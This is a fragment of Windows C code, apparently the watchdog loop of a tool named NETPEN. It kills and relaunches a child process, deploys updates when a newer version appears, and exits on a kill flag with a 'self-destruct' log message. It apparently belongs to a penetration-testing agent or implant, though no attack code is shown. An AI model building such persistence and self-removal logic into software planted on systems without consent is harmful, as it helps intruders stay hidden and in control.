                if (rv > NETPEN_VERSION) {
                    TerminateProcess(pi.hProcess, 1);
                    updated = DeployUpdate(rv);
                    break;
                }
                if (KillFlagExists()) {
                    TerminateProcess(pi.hProcess, 1);
                    break;
                }
            } else {
                break;
            }
        }

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        if (KillFlagExists()) {
            RemoveKillFlag();
            LogMsg("Self-destruct triggered, watchdog exiting");
            break;
        }

        if (updated) {
            LogMsg("Watchdog exiting for update");
            break;
        }

        Sleep(3000);
    }

    return 0;
}









